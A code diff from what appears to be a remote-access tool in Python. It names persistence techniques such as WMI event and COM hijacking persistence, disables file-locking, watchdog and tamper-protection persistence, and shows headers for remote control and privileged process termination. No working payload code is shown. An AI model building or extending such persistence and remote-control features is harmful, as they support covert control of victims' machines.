@@ -1499,9 +1499,9 @@ def establish_persistence():
         system_level_persistence,
         wmi_event_persistence,
         com_hijacking_persistence,
-        file_locking_persistence,
-        watchdog_persistence,
-        tamper_protection_persistence,
+        # file_locking_persistence,  # DISABLED to prevent repeated restarts/popups
+        # watchdog_persistence,      # DISABLED to prevent repeated restarts/popups
+        # tamper_protection_persistence,  # DISABLED to prevent repeated restarts/popups
     ]
     
     success_count = 0
@@ -3870,7 +3870,6 @@ def stop_voice_control():
         VOICE_CONTROL_THREAD = None
         print("Stopped voice control.")
 # --- Remote Control Functions ---
-
 # Global variables for remote control
 REMOTE_CONTROL_ENABLED = False
 LOW_LATENCY_INPUT_HANDLER = None
@@ -6150,7 +6149,6 @@ OPTIMIZED_DASHBOARD_HTML = """<!DOCTYPE html>
 # PROCESS TERMINATION TEST FUNCTIONS
 # From: test_process_termination.py
 # ========================================================================================
-
 def test_process_termination_functionality():
     """Test enhanced process termination with admin privileges functionality."""
     print("Enhanced Process Termination Test")
